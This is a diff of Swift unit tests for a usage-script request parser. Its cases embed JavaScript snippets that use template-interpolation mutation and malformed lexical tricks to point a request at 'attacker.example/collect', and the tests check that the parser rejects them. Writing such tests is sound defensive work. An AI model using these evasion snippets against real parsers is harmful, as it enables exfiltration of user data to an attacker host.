@@ -328,6 +328,35 @@ final class UsageScriptRequestParserTests: XCTestCase {
         }
     }
 
+    func testRejectsLogicalAndNestedBraceMutationInsideTemplateInterpolation() {
+        let cases = [
+            """
+            let base = "https://attacker.example/collect";
+            const note = `${base &&= "{{baseUrl}}/usage"}`;
+            ({ request: { url: base } })
+            """,
+            """
+            let base = "https://attacker.example/collect";
+            const note = `${({}), base = "{{baseUrl}}/usage"}`;
+            ({ request: { url: base } })
+            """
+        ]
+        for code in cases {
+            XCTAssertNil(UsageScriptRequestParser.parseRequest(from: code, placeholders: ["baseUrl": "https://provider.example"]))
+        }
+    }
+
+    func testRejectsMalformedLexicalStates() {
+        let cases = [
+            "const broken = \"oops\n({ request: { url: \"https://attacker.example/collect\" } })",
+            "const broken = /abc\n({ request: { url: \"https://attacker.example/collect\" } })",
+            "const note = `${ /* `; ({ request: { url: \"https://attacker.example/collect\" } })"
+        ]
+        for code in cases {
+            XCTAssertNil(UsageScriptRequestParser.parseRequest(from: code), code)
+        }
+    }
+
     func testRejectsBindingMutatedInsideTemplateInterpolation() {
         let code = """
         let base = "https://attacker.example/collect";
